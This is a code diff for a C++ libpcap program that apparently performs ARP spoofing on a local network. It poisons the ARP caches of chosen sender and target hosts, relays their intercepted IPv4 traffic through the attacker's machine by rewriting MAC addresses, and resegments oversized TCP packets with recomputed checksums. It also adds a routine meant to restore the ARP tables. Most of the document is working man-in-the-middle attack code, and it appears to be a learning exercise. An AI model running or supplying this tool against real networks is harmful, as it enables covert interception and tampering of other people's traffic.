@@ -20,12 +20,15 @@
 #include "../../include/iphdr.hpp"
 #include "../../include/tcphdr.hpp"
 
-using namespace std;
-
 #define TICK_TIME           50000
 #define MAX_MTU             1500
-#define MAX_MSS             1460
+#define MAX_MSS             1400//1460
 #define UDP_HEADER_SIZE     8
+#define PSEUDO_HDR_SIZE     96
+
+#define MAKEWORD(a,b)   ((uint16_t)(((uint8_t)(a))|(((uint16_t)((uint8_t)(b)))<<8)))
+
+using namespace std;
 
 struct Flow {
     Ip sip_;
@@ -49,23 +52,27 @@ struct Packet {
 };
 
 void usage();
-
 bool parse(int argc);
 list<Flow> GetFlowList(int argc, char* argv[]);
 bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac>& arpTable);
 Mac GetInterfaceMac(string interface);
 Mac ResolveMac(const string interface, const Ip ip);
 pcap_t* OpenPcap(const string Interface);
+bool SetPcapFilter(pcap_t* pcap, string filterExpression);
 bool SendPacket(pcap_t* pcap, uint8_t* data,const int size);
 Packet ReadPacket(pcap_t* pcap);
-bool FindPacket(Packet packet, const uint16_t etherType, const Ip ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port);
+void SetIpChecksum(PIpHdr ipHeader);
+void SetTcpChecksum(const uint16_t payloadLen, const PIpHdr ipHeader, PTcpHdr tcpHeader);
 void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket);
 void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket);
 //bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac);
 bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP);
+bool Recover(pcap_t* pcap, list<Flow>& flowList, map<Ip, Mac>& arpTable);
 
-Ip myIp(string("192.168.0.106"));
 
+Ip g_myIp(string("192.168.0.106"));
+Ip g_hostIp(string("192.168.0.100"));
+Ip g_netMask(string("255.255.255.0"));
 
 int main(int argc, char* argv[])
 {
@@ -85,7 +92,12 @@ int main(int argc, char* argv[])
         pcap_t* pcap = OpenPcap(interface);
         if(pcap == NULL) throw runtime_error("Failed to open pcap");
 
-        int currentTime = 0;
+        //packet trace speed
+        string filterExp = "not host " + string(g_hostIp);
+
+        if(!SetPcapFilter(pcap, filterExp)) throw runtime_error("Failed to set filter");
+
+        int currentTime = -TICK_TIME;
         Packet rPacket;
 
         do {
@@ -102,7 +114,7 @@ int main(int argc, char* argv[])
             PEthHdr etherHeader = reinterpret_cast<PEthHdr>(rPacket.buf);
             PArpHdr arpHeader = reinterpret_cast<PArpHdr>(rPacket.buf + sizeof(EthHdr));
             PIpHdr ipHeader = reinterpret_cast<PIpHdr>(rPacket.buf + sizeof(EthHdr));
-            PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(rPacket.buf + sizeof(EthHdr) + ipHeader->len());
+            //PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(rPacket.buf + sizeof(EthHdr) + ipHeader->len());
 
             for(const Flow& f : flowList) {
                 //arp
@@ -118,41 +130,43 @@ int main(int argc, char* argv[])
                 //tcp
                 //udp
                 //sender -> target
-                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->sip_) == f.sip_ && ntohl(ipHeader->dip_) != myIp)) {
+                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->sip_) == f.sip_ && ntohl(ipHeader->dip_) != g_myIp)) {
                     etherHeader->smac_ = attackMac;
                     etherHeader->dmac_ = arpTable[f.tip_];
 
                     //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
-                    if(rPacket.header->caplen > MAX_MTU)
-                        JumboPacketProcessing(pcap, rPacket);
-                        //JumboFrameTcpProcessing(pcap, rPacket);
+                    if(rPacket.header->len > MAX_MTU)
+                        //JumboPacketProcessing(pcap, rPacket);
+                        JumboFrameTcpProcessing(pcap, rPacket);
                     else
-                        SendPacket(pcap, rPacket.buf, rPacket.header->caplen);
+                        if(!SendPacket(pcap, rPacket.buf, rPacket.header->caplen)) cout<<"Single"<<endl;
 
                     break;
                 }
 
                 //target -> sender
-                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->dip_) == f.tip_ && ntohl(ipHeader->sip_) != myIp)) {
+                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->dip_) == f.sip_ && ntohl(ipHeader->dip_) != g_myIp)) {
                     etherHeader->smac_ = attackMac;
-                    etherHeader->dmac_ = arpTable[f.tip_];
+                    //etherHeader->dmac_ = arpTable[f.tip_];
+                    etherHeader->dmac_ = arpTable[f.sip_];
 
                     //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
-                    if(rPacket.header->caplen > MAX_MTU)
-                        JumboPacketProcessing(pcap, rPacket);
-                        //JumboFrameTcpProcessing(pcap, rPacket);
+                    if(rPacket.header->len > MAX_MTU)
+                        //JumboPacketProcessing(pcap, rPacket);
+                        JumboFrameTcpProcessing(pcap, rPacket);
                     else
-                        SendPacket(pcap, rPacket.buf, rPacket.header->caplen);
+                        if(!SendPacket(pcap, rPacket.buf, rPacket.header->caplen)) cout<<"Single"<<endl;
 
                     break;
                 }
             }
         }while(true);
 
+        Recover(pcap, flowList, arpTable);
         pcap_close(pcap);
 
     }catch(const exception& e) {
-        cerr<<"main : "<<e.what()<<endl;
+        cerr<<"[main] "<<e.what()<<endl;
         return -1;
     }
 }
@@ -278,10 +292,25 @@ pcap_t* OpenPcap(const string interface) {
 
     return pcap;
 }
+bool SetPcapFilter(pcap_t* pcap, string filterExpression) {
+    bpf_program bp{};
+
+    try {
+        if(pcap_compile(pcap, &bp, filterExpression.c_str(), 1, g_netMask) == PCAP_ERROR) throw runtime_error("Failed to call pcap_compile");
+        if(pcap_setfilter(pcap, &bp) == PCAP_ERROR) throw runtime_error("Failed to call pcap_setfilter");
+    }catch (const exception& e) {
+        cerr<<"[SetPcapFilter] "<< e.what()<<endl;
+        cout<< "ERROR : "<<pcap_geterr(pcap) << endl;
+        return false;
+    }
+
+    return true;
+}
 
 bool SendPacket(pcap_t* pcap, uint8_t* data, const int size) {
     if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(data), size) == -1) {
-        cerr<<"SendPacket : "<<"Failed to send packet "<<string(pcap_geterr(pcap))<<endl;
+        cerr<<"[SendPacket] "<<"Failed to send packet "<<endl;
+        cerr<<"ERROR : "<<pcap_geterr(pcap)<<endl;
         return false;
     }
 
@@ -303,178 +332,54 @@ Packet ReadPacket(pcap_t* pcap) {
     return packet;
 }
 
-bool FindPacket(Packet packet, const uint16_t etherType, const Ip ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port) {
-    //arp header size : 28
-    if(packet.header->caplen < sizeof(EthHdr) + sizeof(IpHdr)) return false;
+void SetIpChecksum(PIpHdr ipHeader) {
+    uint8_t* data = reinterpret_cast<uint8_t*>(ipHeader);
+    uint32_t len = ipHeader->len();
 
-    EthHdr* etherHeader = reinterpret_cast<EthHdr*>(packet.buf);
-
-    if(etherHeader->type() != etherType) return false;
-
-    switch(etherHeader->type()) {
-    case EthHdr::Arp: {
-        return true;
-        break;
-    }
-    case EthHdr::Ip4: {
-        IpHdr* ipHeader = reinterpret_cast<IpHdr*>(packet.buf + sizeof(EthHdr));
-        //Ip struct compare
-
-        if(ntohl(ipHeader->sip_) == ip || ntohl(ipHeader->dip_) == ip) {
-            if(type != 0 && ipHeader->protocolId_ != type) return false;
-
-            switch(ipHeader->protocolId_) {
-            case IpHdr::PROTOCOL_ID_TYPE::IPv4: {
-                return true;
-                break;
-            }
-            case IpHdr::PROTOCOL_ID_TYPE::ICMP: {
-                return true;
-                break;
-            }
-            case IpHdr::PROTOCOL_ID_TYPE::TCP: {
-                TcpHdr* tcpHeader = reinterpret_cast<TcpHdr*>(packet.buf + sizeof(EthHdr) + ipHeader->len());
-                if(port == 0 || (port == tcpHeader->sPort() || port == tcpHeader->dPort()))
-                    return true;
-                break;
-            }
-            case IpHdr::PROTOCOL_ID_TYPE::UDP: {
-                return true;
-                break;
-            }
-            defualt:
-                break;
-            }
-        }
-        break;
-    }
-    default:
-        break;
-    }
-
-    return false;
-}
-
-uint16_t CalculateIpChecksum(const void* vdata, size_t length) {
-    const uint8_t* data = (const uint8_t*)vdata;
-    uint32_t acc = 0;
-
-    for (size_t i = 0; i + 1 < length; i += 2) {
-        uint16_t word;
-        memcpy(&word, data + i, 2);
-        acc += ntohs(word);
-    }
-
-    if (length & 1) {
-        uint16_t word = 0;
-        memcpy(&word, data + length - 1, 1);
-        acc += ntohs(word);
-    }
-
-    while (acc >> 16)
-        acc = (acc & 0xFFFF) + (acc >> 16);
-
-    return htons(~acc);
-}
-
-struct PseudoHeader {
-    Ip srcAddr;
-    Ip dstAddr;
-    uint8_t reserved;
-    uint8_t protocol;
-    uint16_t tcpLen;
-};
-
-uint16_t CalculateTcpChecksum(IpHdr* ipHdr, TcpHdr* tcpHdr, const uint8_t* payload, uint16_t payloadLen) {
-    uint16_t tcpLen = tcpHdr->len() + payloadLen;
-    PseudoHeader pseudoHdr;
-
-    pseudoHdr.srcAddr = ipHdr->sip_;
-    pseudoHdr.dstAddr = ipHdr->dip_;
-    pseudoHdr.reserved = 0;
-    pseudoHdr.protocol = IPPROTO_TCP;
-    pseudoHdr.tcpLen = htons(tcpLen);
+    ipHeader->headerChecksum_ = 0;
 
     uint32_t acc = 0;
 
-    // Pseudo header
-    const uint16_t* pseudoPtr = (const uint16_t*)&pseudoHdr;
-    for (int i = 0; i < sizeof(PseudoHeader)/2; ++i) {
-        acc += ntohs(pseudoPtr[i]);
-    }
+    for(int i=0; i + 1< len; i+=2)
+        acc += MAKEWORD(data[i], data[i + 1]);
 
-    // TCP header + payload
-    const uint8_t* tcpData = (const uint8_t*)tcpHdr;
-    for (int i = 0; i + 1 < tcpLen; i += 2) {
-        uint16_t word;
-        memcpy(&word, tcpData + i, 2);
-        acc += ntohs(word);
-    }
+    if(len & 1) acc+= static_cast<uint16_t>(data[len-1] << 8);
+    while(acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);
 
-    if (tcpLen & 1) {
-        uint16_t word = 0;
-        memcpy(&word, tcpData + tcpLen - 1, 1);
-        acc += ntohs(word);
-    }
-
-    while (acc >> 16)
-        acc = (acc & 0xFFFF) + (acc >> 16);
-
-    return htons(~acc);
+    ipHeader->headerChecksum_ = ~acc;
 }
 
-// void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket) {
-//     PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
-//     PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));
-//     PTcpHdr oriTcpHeader = reinterpret_cast<PTcpHdr>(jPacket.buf + sizeof(EthHdr) + oriIpHeader->len());
+void SetTcpChecksum(const uint16_t payloadLen, const PIpHdr ipHeader, PTcpHdr tcpHeader) {
+    uint16_t len = tcpHeader->len() + payloadLen;
 
-//     //udp or tcp
-//     const int headerLen = oriIpHeader->protocolId_ == IpHdr::UDP
-//                               ? oriIpHeader->len() + UDP_HEADER_SIZE
-//                               : oriIpHeader->len() + oriTcpHeader->len();
-//     const int maxFragmentPacketSize = MAX_MTU - oriIpHeader->len();
-//     int remainingPacketSize = jPacket.header->caplen - sizeof(EthHdr) - headerLen;
+    tcpHeader->checksum_ = 0;
 
-//     int sendedPacketSize = 0;
-//     int fragmentPacketSize = 0;
-//     int fragmentOffset = 0;
+    TcpHdr::PseudoHdr pseudoHeader{};
 
-//     bool test = true;
+    pseudoHeader.sip_ = ipHeader->sip_;
+    pseudoHeader.dip_ = ipHeader->dip_;
+    pseudoHeader.reserved_ = 0;
+    pseudoHeader.protocol_ = ipHeader->protocolId_;
+    pseudoHeader.len_ = htons(len);
 
-//     while(remainingPacketSize > 0) {
-//         fragmentPacketSize = maxFragmentPacketSize > remainingPacketSize
-//                                  ? remainingPacketSize : maxFragmentPacketSize;
+    uint32_t acc = 0;
 
-//         unique_ptr<uint8_t[]> fragmentPacketBuf(new uint8_t[fragmentPacketSize + sizeof(EthHdr) + headerLen]);
-//         //header
-//         if(test) {
-//             memcpy(fragmentPacketBuf.get(), jPacket.buf, sizeof(EthHdr) + headerLen);
-//         }else {
-//             memcpy(fragmentPacketBuf.get(), jPacket.buf, sizeof(EthHdr) + oriIpHeader->len());
-//         }
-//         //data
-//         if(test) {
-//             memcpy(fragmentPacketBuf.get() + sizeof(EthHdr) + headerLen, jPacket.buf + sizeof(EthHdr) + headerLen + sendedPacketSize, fragmentPacketSize);
-//             test = false;
-//         }else {
-//             memcpy(fragmentPacketBuf.get() + sizeof(EthHdr) + oriIpHeader->len(), jPacket.buf + sizeof(EthHdr) + headerLen + sendedPacketSize, fragmentPacketSize);
-//         }
+    uint8_t* pseudoHeaderPtr = reinterpret_cast<uint8_t*>(&pseudoHeader);
 
-//         PIpHdr ipHeader = reinterpret_cast<PIpHdr>(fragmentPacketBuf.get() + sizeof(EthHdr));
+    for(int i = 0; i + 1 < sizeof(TcpHdr::PseudoHdr); i += 2)
+        acc += MAKEWORD(pseudoHeaderPtr[i], pseudoHeaderPtr[i + 1]);
 
-//         ipHeader->flags_fragOffset_ = remainingPacketSize > maxFragmentPacketSize
-//             ? htons(IpHdr::IP_FLAGS_TYPE::MF | fragmentOffset)
-//             : htons(IpHdr::IP_FLAGS_TYPE::RESORVED | fragmentOffset);
+    uint8_t* tcpHeaderPtr = reinterpret_cast<uint8_t*>(tcpHeader);
 
-//         ipHeader->totalPacketLen_ = htons(oriIpHeader->len() + fragmentPacketSize);
+    for(int i = 0; i + 1 < len; i += 2)
+        acc += MAKEWORD(tcpHeaderPtr[i], tcpHeaderPtr[i + 1]);
 
-//         remainingPacketSize -= fragmentPacketSize;
-//         sendedPacketSize += fragmentPacketSize;
-//         fragmentOffset += fragmentPacketSize / 8;
+    if(len & 1) acc += static_cast<uint16_t>(tcpHeaderPtr[len - 1] << 8);
 
-//         SendPacket(pcap, reinterpret_cast<uint8_t*>(fragmentPacketBuf.get()), sizeof(EthHdr) + oriIpHeader->len() + fragmentPacketSize);
-//     }
-// }
+    while(acc >> 16) acc = (acc & 0xFFFF) + (acc >> 16);
+
+    tcpHeader->checksum_ = ~acc;
+}
 
 void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket) {
     PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
@@ -508,8 +413,8 @@ void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket) {
                                           : htons(IpHdr::IP_FLAGS_TYPE::RESORVED | fragmentOffset);
 
         ipHeader->totalPacketLen_ = htons(ipHeaderLen + fragmentPacketSize);
-        ipHeader->headerChecksum_ = 0;
-        ipHeader->headerChecksum_ = CalculateIpChecksum(ipHeader, ipHeader->len());
+        SetIpChecksum(ipHeader);
+
 
         remainingPacketSize -= fragmentPacketSize;
         sendedPacketSize += fragmentPacketSize;
@@ -536,28 +441,28 @@ void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket) {
         //header
         memcpy(segmentPacket.get(), jPacket.buf, totalHeaderLen);
         //data
-        memcpy(segmentPacket.get() + totalHeaderLen, jPacket.buf + totalHeaderLen, sendBytes);
+        memcpy(segmentPacket.get() + totalHeaderLen, jPacket.buf + totalHeaderLen + sendedBytes, sendBytes);
 
 
 
         PIpHdr ipHeader = reinterpret_cast<PIpHdr>(segmentPacket.get() + sizeof(EthHdr));
         ipHeader->totalPacketLen_ = htons(oriIpHeader->len() + oriTcpHeader->len() + sendBytes);
         //id?
-        ipHeader->id_ += ntohs(sendedBytes);
+        ipHeader->id_ += (1 << 8);
         //checksum?
-        ipHeader->headerChecksum_ = 0;
-        ipHeader->headerChecksum_ = CalculateIpChecksum(ipHeader, ipHeader->len());
+        SetIpChecksum(ipHeader);
 
         PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(segmentPacket.get() + sizeof(EthHdr) + ipHeader->len());
         tcpHeader->seqNumber_ =  htonl(ntohl(oriTcpHeader->seqNumber_) + sendedBytes);
         //checksum?
-        tcpHeader->checksum_ = 0;
-        tcpHeader->checksum_ = CalculateTcpChecksum(ipHeader, tcpHeader, (reinterpret_cast<uint8_t*>(tcpHeader) + tcpHeader->len()), sendBytes);
+        SetTcpChecksum(sendBytes, ipHeader, tcpHeader);
 
         sendedBytes += sendBytes;
         tcpPayloadSize -= sendBytes;
 
-        SendPacket(pcap, segmentPacket.get(), totalHeaderLen + sendBytes);
+        if(!SendPacket(pcap, segmentPacket.get(), totalHeaderLen + sendBytes)) {
+            cout<<"jumbo"<<endl;
+        }
     }
 }
 
@@ -590,5 +495,12 @@ bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip
         cerr<<"Failed to infect : "<<e.what()<<endl;
         return false;
     }
+    return true;
+}
+
+bool Recover(pcap_t* pcap, list<Flow>& flowList, map<Ip, Mac>& arpTable) {
+    for(Flow& f : flowList)
+        if(!Infect(pcap, arpTable[f.sip_], arpTable[f.tip_], f.sip_, f.tip_)) return false;
+
     return true;
 }
